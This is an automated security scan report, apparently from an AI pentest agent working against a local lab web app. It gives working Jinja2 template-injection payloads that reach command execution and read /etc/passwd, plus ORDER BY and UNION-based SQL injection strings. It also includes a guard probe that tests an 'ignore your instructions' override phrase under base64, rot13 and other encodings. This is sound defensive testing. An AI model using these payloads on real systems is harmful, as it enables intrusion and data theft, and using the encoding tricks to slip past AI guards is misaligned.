# Security scan — okf3-fullflow

- target: `http://127.0.0.1:8098` (local)
- isolation: direct — no Tor for local targets (Arti has no loopback route)
- strix: strix-paid · 321s · run /opt/ares/strix/strix_runs/test-vuln-hard_4770
- started 2026-11-11T00:20:39Z · duration 728s

## Findings

### [CRITICAL] Server-Side Template Injection (Jinja2) to RCE in POST /render `tpl` parameter

The `/render` endpoint passes the user-supplied form field `tpl` directly to `flask.render_template_string`, so attacker input becomes Jinja2 template **source code** rather than data. An unauthenticated attacker can evaluate arbitrary expressions and escape to the Python runtime, achieving arbitrary command execution as the application user, arbitrary file read, and disclosure of the application database.

Agent PoC:

1. Establish a baseline by posting ordinary text to the form field: `POST /render` with body `tpl=hello world` returns `hello world`, confirming the field is reflected and rendered.
2. Send an arithmetic expression as the field value: `tpl={{7*7}}` returns `49`; `tpl={{7*8}}` returns `56`. This proves the value is compiled and evaluated by the template engine rather than output literally.
3. Confirm access to framework objects: `tpl={{config}}` returns the serialized Flask configuration object.
4. Escalate to command execution with the object-graph chain `tpl={{cycler.__init__.__globals__.os.popen('id').read()}}`; the response contains `uid=1000(pentester) gid=1000(pentester) groups=1000(pentester),27(sudo)`.
5. Confirm arbitrary command execution and the working directory with `tpl={{cycler.__init__.__globals__.os.popen('uname -a; whoami; pwd').read()}}`.
6. Confirm arbitrary file read with `tpl={{cycler.__init__.__globals__.__builtins__.open('/etc/passwd').read()[:200]}}`.
7. Confirm data disclosure by running `strings /tmp/lab/orders.db | tail -6` through the same chain, returning the `orders` table schema and row values.
8. The supplied script automates steps 1 through 7 and prints each request and response pair.

### [HIGH] SQL Injection in ORDER BY clause via GET /orders sort parameter

The sort query parameter of GET /orders is interpolated directly into an ORDER BY clause without binding or validation. An unauthenticated attacker controls SQL syntax in that position and extracted the hidden note column value flag{orderby_ok} character by character.

Agent PoC:

1. Request GET /orders?sort=id and observe the baseline rows; the note column is never returned.
2. Request GET /orders?sort=(CASE WHEN (1=1) THEN id ELSE -id END) and GET /orders?sort=(CASE WHEN (1=2) THEN id ELSE -id END); the row order flips, confirming control of the sort expression.
3. Request GET /orders?sort=id, and observe HTTP 500, confirming the fragment is parsed as SQL.
4. Run the provided script, which binary-searches each character of note for id=1 through the CASE oracle.
5. Observe the recovered value flag{orderby_ok}.

### [HIGH] UNION-based SQL injection in POST /orders/by-sku sku parameter

The JSON field sku of POST /orders/by-sku is interpolated directly into a single-quoted SQL string literal without binding or escaping. An unauthenticated attacker can break out of the literal and use UNION-based injection to read arbitrary columns and schema metadata, including the note column containing flag{orderby_ok}.

Agent PoC:

1. Send POST /orders/by-sku with body {"sku":"alpha"} and observe the baseline row containing the note value.
2. Send the same request with body {"sku":"' OR '1'='1"} and observe all three rows returned, proving the quote terminates the literal and injects a tautology.
3. Send body {"sku":"' UNION SELECT id, note, sku FROM orders--"} to have the note column returned in the sku position.
4. Send body {"sku":"' UNION SELECT 1, name, sql FROM sqlite_master--"} to dump schema SQL.
5. Observe the extracted flag{orderby_ok} value and the CREATE TABLE statement in the responses.

## Secret scan (betterleaks)

- **50 secret leak(s) found** (values redacted)

  - `generic-credential-uri` · /repo/app.log:4866
  - `generic-credential-uri` · /repo/app.log:4866
  - `generic-api-key` · /repo/app.log:5559
  - `generic-credential-uri` · /repo/app.log:8536
  - `generic-credential-uri` · /repo/app.log:8537
  - `generic-credential-uri` · /repo/app.log:8538
  - `generic-credential-uri` · /repo/app.log:8539
  - `generic-credential-uri` · /repo/app.log:8540
  - `generic-credential-uri` · /repo/app.log:8541
  - `generic-credential-uri` · /repo/app.log:8542
  - `generic-credential-uri` · /repo/app.log:8543
  - `generic-credential-uri` · /repo/app.log:8544
  - `generic-credential-uri` · /repo/app.log:8545
  - `generic-credential-uri` · /repo/app.log:8546
  - `generic-credential-uri` · /repo/app.log:8547

## Independent confirmation

- sqlmap: `{"url": "http://127.0.0.1:8098/orders?sort=1", "injectable": true, "rc": 0, "dbms": "SQLite", "techniques": ["boolean-based blind"], "tables": ["orders"], "dump_rc": 0, "dump_rows": 3, "dumped_table": "orders", "sensitive_exposed": true, "sample": ["| 1  | 3   | alpha | flag{orderby_ok} |", "| 2  | 7   | beta  | nothing          |", "| 3  | 1   | gamma | x                |"], "columns": "| id | qty | sku   | note             |"}`
- sqlmap (POST body): `{"url": "http://127.0.0.1:8098/orders/by-sku", "injectable": true, "rc": 0, "method": "POST", "data_template": "{\"sku\": \"1\"}", "dbms": "SQLite", "techniques": ["UNION query", "boolean-based blind"], "tables": ["orders"], "dump_rc": 0, "dump_rows": 3, "dumped_table": "orders", "sensitive_exposed": true, "sample": ["| 1  | 3   | alpha | flag{orderby_ok} |", "| 2  | 7   | beta  | nothing          |", "| 3  | 1   | gamma | x                |"], "columns": "| id | qty | sku   | note             |", "post_param": "sku", "params_tried": ["sku"]}`
- injection proof (cmdi/traversal): `{"cmdi": [], "traversal": [], "default_exec": [], "requests": 28}`
- sstimap: `{"url": "http://127.0.0.1:8098/render", "vulnerable": true, "confidence": "high", "engine": "Jinja2", "rce": true, "rc": 0, "post_param": "tpl", "post_data_type": "form", "via": "POST body"}`
- xsstrike: `{"vectors": 0}`
- nmap: `{"host": "127.0.0.1", "port": 8098, "services": [["unknown", "1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :"]], "rc": 0}`
- ffuf: paths=1
- nuclei: hits=0
- metasploit: `{"server": "Werkzeug/3.0.1 Python/3.12.3", "module": null, "rc": 0, "candidates": ["exploit/multi/http/werkzeug_debug_rce", "exploit/multi/http/werkzeug_debug_rce"]}`
- sweep: `{"candidates": 14, "sstimap_hits": [], "sstimap_low": [], "xsstrike_hits": []}`

## Guard-gap probe (tripwire)

- transforms flagged: 100% (flag>=0.6, block>=0.9)
- control ('ignore your instructions'): OK · composite 1.0
- guard gaps (below flag threshold): 0/12
  - identity: mean 0.6 · flag 100% · block 0%
  - base64: mean 0.6 · flag 100% · block 0%
  - base64x2: mean 0.6 · flag 100% · block 0%
  - rot13: mean 0.6 · flag 100% · block 0%
  - hex_escape: mean 0.6 · flag 100% · block 0%
  - unicode_escape: mean 0.6 · flag 100% · block 0%

## Since last scan

- new: 3 · persisting: 0 · resolved: 0 · active: 3
  - NEW [33da2bf56a71a0de] Server-Side Template Injection (Jinja2) to RCE in POST /render `tpl` parameter
  - NEW [91099c53f2c1a125] SQL Injection in ORDER BY clause via GET /orders sort parameter
  - NEW [018c3892771fe53a] UNION-based SQL injection in POST /orders/by-sku sku parameter

## Receipt

- receipt: `466d8debfc830fa7c31ebc3a64aeb949bfea4ca9436f34118ea30e0d5cfa7be5`
- merkle: `09bc5b76a8f1dc1174b7fc122e8a1f51a5b8ec2c0b3762449078b1bcd842476e`
- chain_index: 0 · prev: `None`
- artifacts: 22 · diagnostics: 3
- timestamp: OpenTimestamps `466d8debfc830fa7.merkle.txt.ots` (pending Bitcoin attestation)
- verify: `python3 /opt/ares/okf_receipt.py verify /opt/ares/security_receipts/okf3-fullflow/466d8debfc830fa7.json --files`
